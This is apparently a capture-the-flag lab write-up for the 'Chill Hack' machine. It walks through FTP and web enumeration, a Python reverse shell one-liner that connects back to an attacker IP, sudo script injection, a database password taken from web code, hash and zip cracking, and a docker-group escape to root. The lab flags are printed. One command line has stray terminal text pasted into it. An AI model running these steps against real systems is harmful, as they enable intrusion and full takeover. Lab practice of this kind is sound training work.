# Chill Hack

--------------------------------------------------------------------

## GIVEN INFO

**IP Address**: 10.10.207.138

--------------------------------------------------------------------

## PROCEDURE

```
nmap -sV -p- -oN nmap.txt 10.10.207.138
```

**EXPOSED PORT (SERVICE)**:<br>
    21 (ftp vsftpd 3.0.3)<br>
    22 (ssh OpenSSH 7.6p1),<br>
    80 (http Apache httpd 2.4.29)

anonymous ftp login is allowed
```
ftp anonymous@10.10.207.138
```

Foudn note.txt: Anurodh told me that there is some filtering on strings being put in the command -- Apaar

Enumeurate hidden web directories
```
dirb 10.10.207.138 /usr/share/wordlists/dirb/common.txt
```

Found /secret which allows me to execute commands

Commands like "ls" are banned but can use python3 to get reverse shell
```
nc -lnvp 4444
export RHOST="10.6.1.136";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
sudo -l
```

www-data user can run /home/apaar/.helpline.sh as apaar<br>
There is no input validation in this script so whatever I put in the $msg variable will be executed a apaar
```
sudo -u apaar /home/apaar/.helpline.sh
/bin/bash
/bin/bash
```

**USER FLAG**: {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

Upgrade shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Run linpeas
```
chmod +x linpeas
./linpeas
```

Found 2 more open ports (9001 & 3306 which is MySQL)

9001 is a login page
```
curl 127.0.0.1:9001
```

Now we need to find where the code is stored for this page

Found MySQL login in /var/www/files/index.php

**USER**: root<br>
**PASSWORD**: !@m+her00+@db

```
mysql -u root -p
show datases;
use webportal;
show tables;
SELECT * FROM users;

Anurodh Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd
Apaar Dahal    | cullapaar | 686216240e5af30df0501e53c789a649
```

7e53614ced3640d5de23f111806cc4fd = masterpassword<br>
686216240e5af30df0501e53c789a649 = dontaskdonttell<br>

Can't use these passwords for ssh

hacker.php has image that might have hidden data
```
nc -v 10.6.1.136 7777 < hacker-with-laptop_23-2147│[kali@kali] ~  
985341.jpg
nc -lnvp 7777 > pic
steghide extract -sf pic
```

Found backup.zip

```
zip2john backup.zip > 4john
john 4john --wordlist=/usr/share/wordlists/rockyou.txt 
```

**PASSWORD**: pass1word

Found base64 encoded password for Anurodh: IWQwbnRLbjB3bVlwQHNzdzByZA==<br>
**PASSWORD** = !d0ntKn0wmYp@ssw0rd

```
ssh anurodh@10.10.207.138
chmod +x linpeas
./linpeas
```

He is in the docker group which we can exploit

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**ROOT FLAG**: {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}